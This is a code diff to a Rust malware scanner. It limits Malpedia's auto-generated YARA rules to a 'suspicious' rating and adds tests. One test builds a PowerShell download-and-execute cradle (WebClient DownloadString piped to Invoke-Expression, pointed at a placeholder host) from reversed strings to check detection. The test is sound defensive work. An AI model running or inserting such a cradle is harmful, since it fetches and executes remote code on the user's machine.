@@ -190,8 +190,11 @@ impl FileScanner<'_> {
                             _ => {}
                         }
                     }
-                    let category =
-                        category.unwrap_or_else(|| infer_category(rule.identifier(), score));
+                    let category = if is_auto_generated(rule.identifier()) {
+                        Category::Suspicious
+                    } else {
+                        category.unwrap_or_else(|| infer_category(rule.identifier(), score))
+                    };
                     let score = score.map(|s| format!(", score {s}")).unwrap_or_default();
                     findings.push(Finding {
                         threat: threat.unwrap_or_else(|| rule.identifier().to_string()),
@@ -215,6 +218,14 @@ impl FileScanner<'_> {
             warnings,
         }
     }
+}
+
+/// Malpedia's machine-generated rules (`MALPEDIA_Win_<family>_Auto` in YARA
+/// Forge): byte sequences picked from samples, often compiler or library code
+/// (libpng, libstdc++, launcher stubs) that clean programs share. A match is
+/// only ever suspicious, whatever the rule's score.
+pub fn is_auto_generated(identifier: &str) -> bool {
+    identifier.starts_with("MALPEDIA_") && identifier.ends_with("_Auto")
 }
 
 /// Category for a rule without `category` meta, as in most public rule sets.
@@ -441,6 +452,50 @@ mod tests {
         assert_eq!(infer_category("ELASTIC_Windows_Trojan_Agent", Some(75)), Category::Malware);
         assert_eq!(infer_category("ELASTIC_Windows_Trojan_Agent", Some(60)), Category::Suspicious);
         assert_eq!(infer_category("SomeRule", None), Category::Suspicious);
+    }
+
+    #[test]
+    fn auto_generated_rules_are_only_suspicious() {
+        assert!(is_auto_generated("MALPEDIA_Win_Triback_Loader_Auto"));
+        assert!(!is_auto_generated("MALPEDIA_Win_Emotet"));
+        assert!(!is_auto_generated("ELASTIC_Windows_Trojan_Auto"));
+
+        let tmp = tempfile::tempdir().unwrap();
+        let needle: String = "edoc-yrarbil".chars().rev().collect();
+        let rule = format!(
+            "rule MALPEDIA_Win_Test_Auto {{ meta: score = 100 category = \"malware\" strings: $a = \"{needle}\" condition: $a }}"
+        );
+        fs::write(tmp.path().join("feed.rules"), encode_rules(&rule)).unwrap();
+        let engine = Engine::new(&EngineConfig {
+            signature_dir: Some(tmp.path().to_path_buf()),
+            ..Default::default()
+        })
+        .unwrap();
+        let verdict = engine.scanner().scan(format!("x {needle} y").as_bytes());
+        assert_eq!(verdict.findings[0].threat, "MALPEDIA_Win_Test_Auto");
+        assert_eq!(verdict.findings[0].category, Category::Suspicious);
+    }
+
+    #[test]
+    fn downloader_rule_skips_programs() {
+        // Reversed so the test binary never holds the detected strings.
+        let rev = |s: &str| s.chars().rev().collect::<String>();
+        let script = format!(
+            "$c = New-Object {}; {} ($c.{}('http://x.example/a'))",
+            rev("tneilCbeW.teN"),
+            rev("noisserpxE-ekovnI"),
+            rev("gnirtSdaolnwoD")
+        );
+        let threats = |data: &[u8]| -> Vec<String> {
+            engine().scanner().scan(data).findings.into_iter().map(|f| f.threat).collect()
+        };
+        assert!(threats(script.as_bytes()).contains(&"Suspicious.PowerShell.Downloader".to_string()));
+
+        // A .NET library holding the same names (Azure.Identity does).
+        let mut program = b"MZ\x90\x00".to_vec();
+        program.resize(512, 0);
+        program.extend_from_slice(script.as_bytes());
+        assert!(!threats(&program).contains(&"Suspicious.PowerShell.Downloader".to_string()));
     }
 
     #[test]
